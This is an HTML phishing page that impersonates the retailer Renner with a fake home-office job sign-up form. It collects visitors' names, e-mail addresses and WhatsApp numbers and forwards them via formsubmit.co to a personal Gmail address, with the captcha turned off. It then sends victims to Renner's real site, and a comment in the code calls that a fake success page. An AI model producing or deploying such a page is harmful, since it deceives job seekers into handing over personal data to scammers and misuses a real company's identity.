<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cadastro de Vagas | Renner</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      color: #333;
    }

    header {
      background-color: #b80000;
      color: white;
      padding: 1.2rem;
      text-align: center;
      font-size: 1.4rem;
    }

    main {
      padding: 2rem;
      max-width: 400px;
      margin: auto;
      background-color: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      margin-top: 3rem;
      border-radius: 8px;
    }

    h2 {
      color: #b80000;
      text-align: center;
    }

    label {
      display: block;
      margin-top: 1.2rem;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 0.7rem;
      margin-top: 0.3rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      margin-top: 1.5rem;
      width: 100%;
      background-color: #b80000;
      color: white;
      padding: 0.9rem;
      border: none;
      border-radius: 4px;
      font-size: 1rem;
      cursor: pointer;
    }

    button:hover {
      background-color: #990000;
    }

    .footer {
      text-align: center;
      font-size: 0.9rem;
      color: #aaa;
      margin-top: 2rem;
    }
  </style>
</head>
<body>
  <header>
    Vagas Renner - Home Office
  </header>

  <main>
    <h2>Cadastre-se agora</h2>
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://renner.com.br/sucesso"> <!-- ou outra página falsa de sucesso -->

      <label for="nome">Nome completo</label>
      <input type="text" id="nome" name="Nome" required />

      <label for="email">E-mail</label>
      <input type="email" id="email" name="Email" required />

      <label for="whatsapp">WhatsApp</label>
      <input type="text" id="whatsapp" name="WhatsApp" placeholder="(00) 00000-0000" required />

      <button type="submit">Cadastrar</button>
    </form>
    <div class="footer">
      © Renner 2025 - Todos os direitos reservados
    </div>
  </main>
</body>
</html>
